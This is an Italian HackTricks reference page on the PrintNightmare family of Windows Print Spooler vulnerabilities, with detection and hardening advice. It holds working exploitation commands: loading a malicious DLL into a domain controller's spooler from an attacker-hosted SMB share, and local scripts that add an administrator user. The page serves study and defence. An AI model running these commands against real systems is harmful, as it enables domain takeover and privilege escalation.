# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare è il nome collettivo dato a una famiglia di vulnerabilità nel servizio **Print Spooler** di Windows che consentono **l'esecuzione di codice arbitrario come SYSTEM** e, quando lo spooler è raggiungibile tramite RPC, **l'esecuzione remota di codice (RCE) su controller di dominio e server di file**. Le CVE più ampiamente sfruttate sono **CVE-2021-1675** (inizialmente classificata come LPE) e **CVE-2021-34527** (RCE completa). Problemi successivi come **CVE-2021-34481 (“Point & Print”)** e **CVE-2022-21999 (“SpoolFool”)** dimostrano che la superficie di attacco è ancora lontana dalla chiusura.

---

## 1. Componenti vulnerabili & CVE

| Anno | CVE | Nome breve | Primitiva | Note |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Corretto nel CU di giugno 2021 ma bypassato da CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx consente agli utenti autenticati di caricare un driver DLL da una condivisione remota|
|2021|CVE-2021-34481|“Point & Print”|LPE|Installazione di driver non firmati da parte di utenti non amministratori|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Creazione arbitraria di directory → piantagione di DLL – funziona dopo le patch del 2021|

Tutti abusano di uno dei metodi RPC **MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) o delle relazioni di fiducia all'interno di **Point & Print**.

## 2. Tecniche di sfruttamento

### 2.1 Compromissione del Domain Controller remoto (CVE-2021-34527)

Un utente di dominio autenticato ma **non privilegiato** può eseguire DLL arbitrarie come **NT AUTHORITY\SYSTEM** su uno spooler remoto (spesso il DC) tramite:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
PoC popolari includono **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) e i moduli `misc::printnightmare / lsa::addsid` di Benjamin Delpy in **mimikatz**.

### 2.2 Escalation dei privilegi locali (qualsiasi Windows supportato, 2021-2024)

La stessa API può essere chiamata **localmente** per caricare un driver da `C:\Windows\System32\spool\drivers\x64\3\` e ottenere privilegi SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – bypassing 2021 fixes

Le patch di Microsoft del 2021 hanno bloccato il caricamento remoto dei driver ma **non hanno indurito i permessi delle directory**. SpoolFool sfrutta il parametro `SpoolDirectory` per creare una directory arbitraria sotto `C:\Windows\System32\spool\drivers\`, rilascia un DLL payload e costringe lo spooler a caricarlo:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> L'exploit funziona su Windows 7 → Windows 11 e Server 2012R2 → 2022 completamente aggiornati prima degli aggiornamenti di febbraio 2022

---

## 3. Rilevamento e ricerca

* **Event Logs** – abilita i canali *Microsoft-Windows-PrintService/Operational* e *Admin* e osserva per **Event ID 808** “Il servizio di stampa non è riuscito a caricare un modulo plug-in” o per messaggi **RpcAddPrinterDriverEx**.
* **Sysmon** – `Event ID 7` (Immagine caricata) o `11/23` (Scrittura/cancellazione file) all'interno di `C:\Windows\System32\spool\drivers\*` quando il processo padre è **spoolsv.exe**.
* **Process lineage** – avvisi ogni volta che **spoolsv.exe** genera `cmd.exe`, `rundll32.exe`, PowerShell o qualsiasi binario non firmato.

## 4. Mitigazione e indurimento

1. **Patch!** – Applica l'ultimo aggiornamento cumulativo su ogni host Windows che ha installato il servizio Print Spooler.
2. **Disabilita lo spooler dove non è necessario**, specialmente sui Domain Controllers:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Blocca le connessioni remote** consentendo comunque la stampa locale – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Restrizione Point & Print** affinché solo gli amministratori possano aggiungere driver impostando il valore del registro:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Guida dettagliata in Microsoft KB5005652

---

## 5. Ricerca / strumenti correlati

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) moduli
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* SpoolFool exploit & write-up
* 0patch micropatches per SpoolFool e altri bug dello spooler

---

**Ulteriori letture (esterno):** Controlla il post del blog del walkthrough 2024 – [Understanding PrintNightmare Vulnerability](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## Riferimenti

* Microsoft – *KB5005652: Gestire il nuovo comportamento di installazione del driver predefinito Point & Print*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
